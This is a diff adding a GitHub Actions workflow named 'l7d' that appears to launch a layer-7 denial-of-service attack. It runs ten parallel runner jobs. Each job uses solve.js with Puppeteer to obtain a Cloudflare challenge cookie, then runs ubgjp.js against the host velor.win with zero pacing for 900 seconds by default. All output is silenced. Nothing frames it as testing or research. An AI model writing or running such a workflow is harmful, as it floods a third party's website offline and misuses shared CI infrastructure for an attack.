@@ -1,0 +1,28 @@
+name: l7d
+on:
+  workflow_dispatch:
+    inputs:
+      seconds: { default: '900' }
+jobs:
+  r:
+    strategy:
+      fail-fast: false
+      matrix:
+        n: [1,2,3,4,5,6,7,8,9,10]
+    runs-on: ubuntu-latest
+    timeout-minutes: 35
+    steps:
+      - uses: actions/checkout@v4
+      - name: deps
+        run: |
+          sudo apt-get update -qq >/dev/null 2>&1
+          sudo apt-get install -y -qq xvfb >/dev/null 2>&1
+          npm i puppeteer-core --no-save --no-audit --no-fund >/dev/null 2>&1 || true
+      - name: solve + hit
+        run: |
+          export TARGET_HOST=velor.win
+          unset SOLVE_PROXY SOLVE_PROXY_USER SOLVE_PROXY_PASS
+          for a in 1 2 3; do [ -s cf_cookie.txt ] && break; timeout 210 xvfb-run -a node solve.js >/dev/null 2>&1; sleep 2; done
+          echo "cookie=$(wc -c < cf_cookie.txt 2>/dev/null || echo 0)"
+          [ -s cf_cookie.txt ] || { echo NOCOOKIE; exit 0; }
+          TARGET_HOST=velor.win PACE_MS=0 node ubgjp.js mixed 20 ${{ inputs.seconds }}
